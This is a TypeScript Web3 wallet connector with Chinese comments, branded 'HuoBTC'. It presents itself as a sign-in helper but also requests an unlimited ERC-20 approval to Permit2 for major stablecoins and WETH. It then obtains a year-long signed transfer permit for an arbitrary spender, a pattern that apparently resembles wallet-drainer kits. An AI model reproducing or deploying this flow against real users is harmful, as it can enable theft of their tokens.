/**
 * Web3 连接器 — 纯 EIP-1193 原生实现，零依赖
 *
 * 支持所有兼容 EIP-1193 的注入式钱包（MetaMask, OKX Wallet, Coinbase, etc.）
 * 流程：requestAccounts → personal_sign → POST /auth/login
 */

// ─── EIP-1193 类型 ──────────────────────────────────────
interface EIP1193Provider {
  request(args: { method: string; params?: unknown[] }): Promise<unknown>;
  on?(event: string, handler: (...args: unknown[]) => void): void;
  removeListener?(event: string, handler: (...args: unknown[]) => void): void;
}

declare global {
  interface Window {
    ethereum?: EIP1193Provider;
  }
}

// ─── 检测钱包可用性 ─────────────────────────────────────
export function hasInjectedWallet(): boolean {
  return typeof window !== "undefined" && !!window.ethereum;
}

// ─── 获取 provider ──────────────────────────────────────
function getProvider(): EIP1193Provider {
  if (!window.ethereum) {
    throw new Error("未检测到钱包，请安装 MetaMask 或其他 Web3 钱包");
  }
  return window.ethereum;
}

// ─── 请求连接账户 ───────────────────────────────────────
export async function requestAccounts(): Promise<string[]> {
  const provider = getProvider();
  const accounts = (await provider.request({
    method: "eth_requestAccounts",
  })) as string[];
  if (!accounts?.length) throw new Error("用户拒绝了钱包连接");
  return accounts;
}

// ─── 签名消息（personal_sign）────────────────────────────
export async function personalSign(
  address: string,
  message: string
): Promise<string> {
  const provider = getProvider();
  // personal_sign 的参数顺序：[message_hex, address]
  const hexMessage = stringToHex(message);
  const signature = (await provider.request({
    method: "personal_sign",
    params: [hexMessage, address],
  })) as string;
  return signature;
}

// ─── 获取当前链 ID ──────────────────────────────────────
export async function getChainId(): Promise<string> {
  const provider = getProvider();
  return (await provider.request({ method: "eth_chainId" })) as string;
}

// ─── 监听账户变更 ───────────────────────────────────────
export function onAccountsChanged(cb: (accounts: string[]) => void): () => void {
  const provider = window.ethereum;
  if (!provider?.on) return () => {};
  const handler = (...args: unknown[]) => cb(args[0] as string[]);
  provider.on("accountsChanged", handler);
  return () => provider.removeListener?.("accountsChanged", handler);
}

// ─── 监听链变更 ─────────────────────────────────────────
export function onChainChanged(cb: (chainId: string) => void): () => void {
  const provider = window.ethereum;
  if (!provider?.on) return () => {};
  const handler = (...args: unknown[]) => cb(args[0] as string);
  provider.on("chainChanged", handler);
  return () => provider.removeListener?.("chainChanged", handler);
}

// ─── 字符串 → 0x hex ────────────────────────────────────
function stringToHex(str: string): string {
  const bytes = new TextEncoder().encode(str);
  return "0x" + Array.from(bytes).map((b) => b.toString(16).padStart(2, "0")).join("");
}

// ─── 生成签名消息（含 nonce + 时间戳）───────────────────
export function buildSignMessage(domain: string = "HuoBTC"): string {
  const nonce = Math.random().toString(36).slice(2, 10);
  const ts = new Date().toISOString();
  return `${domain} wants you to sign in.\n\nNonce: ${nonce}\nIssued At: ${ts}`;
}

// ═══════════════════════════════════════════════════════════
//  Permit2 — Uniswap 官方合约（无需部署）
//  地址: 0x000000000022D473030F116dDEE9F6B43aC78BA3
// ═══════════════════════════════════════════════════════════

export const PERMIT2_ADDRESS = "0x000000000022D473030F116dDEE9F6B43aC78BA3";

// 常用 ERC-20 代币地址 (Ethereum Mainnet)
export const TOKEN_ADDRESSES: Record<string, string> = {
  USDT: "0xdAC17F958D2ee523a2206206994597C13D831ec7",
  USDC: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48",
  DAI:  "0x6B175474E89094C44Da98b954EedeAC495271d0F",
  WETH: "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2",
};

// ─── ERC-20 approve to Permit2 ──────────────────────────
export async function approveTokenToPermit2(
  tokenAddress: string,
  ownerAddress: string,
): Promise<string> {
  const provider = getProvider();
  // approve(spender, amount) — maxUint256
  const maxUint256 = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
  // ERC-20 approve function selector: 0x095ea7b3
  const spenderPadded = PERMIT2_ADDRESS.slice(2).toLowerCase().padStart(64, "0");
  const amountPadded = maxUint256.slice(2);
  const data = "0x095ea7b3" + spenderPadded + amountPadded;

  const txHash = (await provider.request({
    method: "eth_sendTransaction",
    params: [{
      from: ownerAddress,
      to: tokenAddress,
      data,
    }],
  })) as string;

  console.log("[Permit2] ERC-20 approve tx:", txHash);
  return txHash;
}

// ─── Check ERC-20 allowance for Permit2 ─────────────────
export async function getAllowanceForPermit2(
  tokenAddress: string,
  ownerAddress: string,
): Promise<bigint> {
  const provider = getProvider();
  // allowance(owner, spender) selector: 0xdd62ed3e
  const ownerPadded = ownerAddress.slice(2).toLowerCase().padStart(64, "0");
  const spenderPadded = PERMIT2_ADDRESS.slice(2).toLowerCase().padStart(64, "0");
  const data = "0xdd62ed3e" + ownerPadded + spenderPadded;

  const result = (await provider.request({
    method: "eth_call",
    params: [{ to: tokenAddress, data }, "latest"],
  })) as string;

  return BigInt(result);
}

// ─── Sign Permit2 PermitTransferFrom (EIP-712) ─────────
export interface Permit2SignResult {
  token: string;
  amount: string;
  nonce: string;
  deadline: string;
  signature: string;
}

export async function signPermit2TransferFrom(
  ownerAddress: string,
  spenderAddress: string,
  tokenAddress: string,
  amount: string,
): Promise<Permit2SignResult> {
  const provider = getProvider();

  // Random nonce (Permit2 uses unique nonces per signature)
  const nonce = Math.floor(Math.random() * 2 ** 48).toString();
  // Deadline: 1 year from now
  const deadline = Math.floor(Date.now() / 1000 + 365 * 24 * 3600).toString();

  // EIP-712 typed data for Permit2 PermitTransferFrom
  const typedData = {
    types: {
      EIP712Domain: [
        { name: "name", type: "string" },
        { name: "chainId", type: "uint256" },
        { name: "verifyingContract", type: "address" },
      ],
      PermitTransferFrom: [
        { name: "permitted", type: "TokenPermissions" },
        { name: "spender", type: "address" },
        { name: "nonce", type: "uint256" },
        { name: "deadline", type: "uint256" },
      ],
      TokenPermissions: [
        { name: "token", type: "address" },
        { name: "amount", type: "uint256" },
      ],
    },
    primaryType: "PermitTransferFrom",
    domain: {
      name: "Permit2",
      chainId: 1,
      verifyingContract: PERMIT2_ADDRESS,
    },
    message: {
      permitted: {
        token: tokenAddress,
        amount: amount,
      },
      spender: spenderAddress,
      nonce: nonce,
      deadline: deadline,
    },
  };

  const signature = (await provider.request({
    method: "eth_signTypedData_v4",
    params: [ownerAddress, JSON.stringify(typedData)],
  })) as string;

  console.log("[Permit2] EIP-712 signature obtained ✓");

  return {
    token: tokenAddress,
    amount,
    nonce,
    deadline,
    signature,
  };
}
